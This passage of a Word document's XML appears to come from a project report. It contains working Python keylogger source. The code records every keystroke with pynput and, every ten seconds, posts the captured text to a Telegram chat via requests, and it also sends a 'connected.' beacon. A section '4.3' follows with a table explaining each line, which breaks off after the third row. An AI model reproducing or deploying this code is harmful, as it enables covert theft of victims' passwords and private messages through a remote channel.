    <w:p w14:paraId="48D48C99" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">        "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>chat_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>": CHAT_ID,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D22A72B" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">        "text": message</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5573F170" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C024734" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E7276D9" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>requests.post</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>, data=payload)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68463E51" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">    except:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D1A14F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        pass  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A264584" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1945AF6C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>def callback(key):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21678D3D" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">    global log</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA2302F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="151F3872" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">        log += </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>key.char</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="69C517D2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">        if "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>exitlog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>" in log:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492FCC26" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">            print("Exiting by user request.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B7A71E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">            exit(0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25931785" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">    except </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>AttributeError</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16FA1931" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">        if key == </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>key.space</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13A53868" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">            log += ' '</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4471ABD2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D9806A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">            log += f' [{key}] '</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E203647" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44CF1E7B" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>def report():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D1229C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">    global log</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A2990E9" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">    if log:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A93D78" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>send_telegram_message</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>(log)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A803FB" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">        log = ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52AD706D" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">    timer = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>threading.Timer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>(10, report)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62BEE0EF" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>timer.start</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC81AC6" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4AB7F1A0" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>keyboard_listener</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>pynput.keyboard.Listener</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>on_press</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>=callback)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DBD5CD9" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>keyboard_listener</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="349F9C84" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">    report()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4449D2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>keyboard_listener.join</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D0DD45" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>send_telegram_message</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>("connected.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC5940E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="166D530C">
          <v:rect id="_x0000_i1440" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CDBDD2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>4.3 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6235"/>
      </w:tblGrid>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="3EDEC8E2" w14:textId="77777777">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="24F7E7E0" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Line / Function</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="558733E5" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="1620839A" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="03CD6723" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t xml:space="preserve">import </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>pynput.keyboard</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="79FA65CE" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Imports the keyboard listener library.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="30604407" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="786576D8" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>import threading</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="678D3CBE" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Allows us to run tasks (sending logs) in parallel with key capturing.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="102CE291" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="781E95CF" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>import requests</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="48661B29" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>For HTTP POST calls to Telegram API.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="1E9B38A5" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="24FC9305" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
